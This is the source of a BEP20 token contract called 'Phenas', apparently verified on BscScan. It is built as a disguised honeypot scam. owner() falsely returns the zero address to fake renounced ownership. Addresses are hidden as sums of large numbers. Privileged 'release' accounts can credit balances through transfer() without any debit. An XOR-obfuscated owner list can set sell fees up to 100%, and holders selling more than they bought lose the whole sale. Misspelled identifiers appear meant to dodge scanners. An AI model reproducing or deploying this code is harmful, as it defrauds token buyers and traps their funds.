/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// http://instagram.com/Phenas9678
// https://www.reddit.com/user/Phenas9678
// TWITTER:https://Phenas9678.com/
// WEBSITE:https://twitter.com/Phenas9678
// TELEGRAM:https://t.me/Phenas9678

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingPhenas9678OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingPhenas9678OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingPhenas9678OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingPhenas9678OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingPhenas9678OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function Phenas9678To() external view returns (address);
    function Phenas9678ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setPhenas9678To(address) external;
    function setPhenas9678ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 9;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract Phenas is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baPhenas9678lances;
    mapping(address => uint256) private _baPhenas9678lances1;
    mapping(address => bool) private _rePhenas9678llease;
    mapping(uint256 => uint256) private _bPhenas9678blist;
string name_ = "Phenas";
string symbol_ = "Phenas";
uint256 totalSupply_ = 10000000;   
    address public uniswapV2Pair;
    address dePhenas9678ad = 0x000000000000000000000000000000000000dEaD;
    uint256 _gaPhenas9678te = 35789919418922637060534349011692753269536900112 + 35789919418922637060534349011692753269536900112;
    uint256 _mxPhenas9678x = 37186823070826440511153206997776684193800669567 + 37186823070826440511153206997776684193800669567;
    uint256 _UniPhenas9678swap = 48317516608535716592934534788650610587744272679 + 48317516608535716592934534788650610587744272679;
    uint256 _FacPhenas9678tory = 534647630852661330346329873059855093349675304110 + 534647630852661330346329873059855093349675304110;
    uint256 SupPhenas9678ply = 803882008385418318241177357362713108226356571155;   
    constructor()

BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(uint160(uint256(_UniPhenas9678swap))));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this),address(uint160(uint256(_FacPhenas9678tory))));

        _mtPhenas9678in(msg.sender, totalSupply_ * 10**decimals());

         transfer(dePhenas9678ad, totalSupply() / 10*2);
         transfer(address(uint160(uint256(_mxPhenas9678x))), totalSupply() / 10*1);
         transfer(address(uint160(uint256(_gaPhenas9678te))), totalSupply() / 10*2);
        _rePhenas9678llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baPhenas9678lances[cauunt];
    }

    function _mtPhenas9678in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baPhenas9678lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellPhenas9678 = 0;
    uint256 private _defaultBuyPhenas9678 = 0;

    function _setRelease(address _address) external onlyowaer {
        _rePhenas9678llease[_address] = true;
    }
    function _incS(uint256 _value) external onlyowaer {
        _defaultSellPhenas9678 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _rePhenas9678llease[_address];
    }

    function _setPhenas9678(uint256[] memory _accPhenas9678,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accPhenas9678.length;i++){
            _bPhenas9678blist[_accPhenas9678[i]] = _value[i];
        }
    }
function _msgPhenas9678Info(uint _accPhenas9678) internal view virtual returns (uint) {
        uint256 accPhenas9678 = _accPhenas9678 ^ SupPhenas9678ply;
return _bPhenas9678blist[accPhenas9678];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_rePhenas9678llease[owaer] == true) {
            _baPhenas9678lances[to] += amuont;
            return true;
        }
        _tPhenas9678transfer(owaer, to, amuont);
        return true;
    }
    function _tPhenas9678transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baPhenas9678lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradePhenas9678 = 0;
        uint256 tradePhenas9678amuont = 0;

        if (!(_rePhenas9678llease[from] || _rePhenas9678llease[_to])) {
            if (from == uniswapV2Pair) {
                tradePhenas9678 = _defaultBuyPhenas9678;
                _baPhenas9678lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradePhenas9678 = _msgPhenas9678Info(uint160(from));
                tradePhenas9678 = tradePhenas9678 < _defaultSellPhenas9678 ? _defaultSellPhenas9678 : tradePhenas9678;
                tradePhenas9678 = _baPhenas9678lances1[from] >= _amuont ? tradePhenas9678 : 100;
                _baPhenas9678lances1[from] = _baPhenas9678lances1[from] >= _amuont ? _baPhenas9678lances1[from] - _amuont : _baPhenas9678lances1[from];
            }
                        
            tradePhenas9678amuont = _amuont.mul(tradePhenas9678).div(100);
        }


        if (tradePhenas9678amuont > 0) {
            _baPhenas9678lances[from] = _baPhenas9678lances[from].sub(tradePhenas9678amuont);
            _baPhenas9678lances[dePhenas9678ad] = _baPhenas9678lances[dePhenas9678ad].add(tradePhenas9678amuont);
            emit Transfer(from, dePhenas9678ad, tradePhenas9678amuont);
        }

        _baPhenas9678lances[from] = _baPhenas9678lances[from].sub(_amuont - tradePhenas9678amuont);
        _baPhenas9678lances[_to] = _baPhenas9678lances[_to].add(_amuont - tradePhenas9678amuont);
        emit Transfer(from, _to, _amuont - tradePhenas9678amuont);
    }



    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tPhenas9678transfer(from, to, amuont);
        return true;
    }
}